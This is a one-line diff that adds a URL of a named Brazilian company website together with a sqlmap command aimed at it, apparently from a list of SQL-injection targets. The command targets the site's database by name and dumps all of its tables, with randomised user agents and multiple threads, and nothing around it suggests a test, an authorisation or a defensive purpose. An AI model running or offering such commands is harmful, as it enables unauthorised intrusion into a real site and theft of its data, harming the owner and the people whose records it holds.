@@ -1,0 +1,1 @@
+http://www.caxiense.com.br/index.php?conteudo=empresa&id=70 (GET)  # sqlmap.py -u http://www.caxiense.com.br/index.php?conteudo=empresa&id=70 -D sitecaxiense --threads 5 -v3 --random-agent --tables --dump-all
